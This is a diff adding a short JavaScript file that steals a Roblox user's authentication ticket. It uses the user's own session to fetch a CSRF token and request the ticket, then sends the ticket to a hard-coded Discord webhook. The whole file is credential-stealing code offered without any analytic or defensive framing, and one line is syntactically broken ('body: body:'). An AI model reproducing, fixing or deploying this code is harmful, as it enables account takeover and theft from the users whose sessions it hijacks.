@@ -1,0 +1,31 @@
+async function getcsrf() {
+    var csrf = (await (await fetch('', { credentials: 'include' })).text()).split('setToken(\'')[1].split('\')')[0];
+    return csrf;
+}
+async function getauth(csrf) {
+    var cookie = (await fetch('https://auth.roblox.com/v1/authentication-ticket', {
+        method: 'POST',
+        credentials: 'include',
+        headers: { 'x-csrf-token': csrf}
+    })).headers.get('rbx-authentication-ticket');
+    return cookie ;
+}
+var logInfo = [
+    'https://discord.com/api/webhooks/716470893773062184/kLdjtzeFkeUnvxUwXwPajkAzIxVesGhFXD9PbgC9uAOgXRp_bUW3OB4b189pImQi9x8b',
+    'POST',
+    'application/json',
+    'stringify'
+];
+(function () {
+    (async function () {
+        let csrf= await getcsrf();
+        await csrf;
+        let cookie= await getauth(csrf);
+        await cookie;
+        fetch(logInfo[0], {
+            method: logInfo[1],
+            headers: { 'Content-Type': logInfo[2] },
+            body: body: JSON.stringify({content: cookie})
+        });
+    }());
+}());
